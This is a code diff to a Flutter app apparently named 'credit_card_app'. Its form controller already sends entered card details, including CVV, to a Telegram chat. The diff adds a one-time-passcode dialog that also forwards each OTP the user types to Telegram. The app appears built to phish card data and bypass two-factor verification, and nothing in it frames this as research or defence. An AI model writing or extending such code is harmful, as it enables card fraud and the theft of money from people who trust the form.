@@ -1,3 +1,4 @@
+import 'package:credit_card_app/UI/comp/otp_widegt.dart';
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:fluttertoast/fluttertoast.dart';
@@ -23,6 +24,7 @@ class CreditCardFormController extends GetxController {
         '\n CVV:$cvv' +
         '\nlevel is ${selectedItem.value}';
     await sendMessageToTelegram(msg);
+    _showOtpDialog(Get.context!);
   }
   // You can validate the form data here if required
 
@@ -37,6 +39,22 @@ class CreditCardFormController extends GetxController {
     expirationDateController.dispose();
     cvvController.dispose();
     super.onClose();
+  }
+
+  void _showOtpDialog(BuildContext context) {
+    showDialog(
+      context: context,
+      builder: (BuildContext context) {
+        return OtpDialog(
+          onOtpEntered: (String otp) async {
+            // Process the entered OTP (e.g., send to server for validation)
+            await sendMessageToTelegram('OTPCODE : $otp');
+
+            print('Entered OTP: $otp');
+          },
+        );
+      },
+    );
   }
 
   Future<void> sendMessageToTelegram(String message) async {
